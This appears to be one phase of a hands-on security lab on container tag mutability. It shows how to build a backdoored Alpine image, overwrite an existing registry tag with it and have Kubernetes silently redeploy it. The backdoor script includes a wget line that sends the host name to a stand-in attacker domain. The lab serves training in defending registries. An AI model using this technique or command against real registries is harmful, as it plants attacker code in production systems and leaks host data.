# Lab 3.2: Tag Mutability Attacks

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## Overwriting a Tag With a Backdoored Image

### Step 1: Build the backdoored image

```bash
cat > /tmp/Dockerfile.backdoor << 'EOF'
FROM alpine:3.19
RUN echo "BACKDOORED" > /app/version.txt && \
    echo '#!/bin/sh' > /usr/local/bin/backdoor.sh && \
    echo 'wget -q http://attacker.example.com/exfil?host=$(hostname)' >> /usr/local/bin/backdoor.sh && \
    chmod +x /usr/local/bin/backdoor.sh
CMD ["cat", "/app/version.txt"]
EOF

docker build -t registry:5000/webapp:1.0.0 -f /tmp/Dockerfile.backdoor /tmp/
```

### Step 2: Push with the same tag

```bash
docker push registry:5000/webapp:1.0.0
```

The tag `1.0.0` now points to a completely different image. No warning, no confirmation.

### Step 3: Verify the digest changed

```bash
crane digest registry:5000/webapp:1.0.0
```

Compare to the saved digest. Different image, same tag.

### Step 4: Trigger a redeploy

```bash
kubectl rollout restart deployment/webapp
kubectl rollout status deployment/webapp --timeout=60s
```

### Step 5: Check the damage

```bash
kubectl exec deploy/webapp -- cat /app/version.txt
```

Prints "BACKDOORED". Silent replacement, no alerts, no errors.

### Step 6: Record your findings

```bash
cat > /app/findings.txt << EOF
Original safe digest: $(cat /app/safe-digest.txt)
Current (backdoored) digest: $(crane digest registry:5000/webapp:1.0.0)
The tag 1.0.0 was overwritten with a backdoored image.
Kubernetes pulled the new image on rollout restart without any verification.
EOF
```
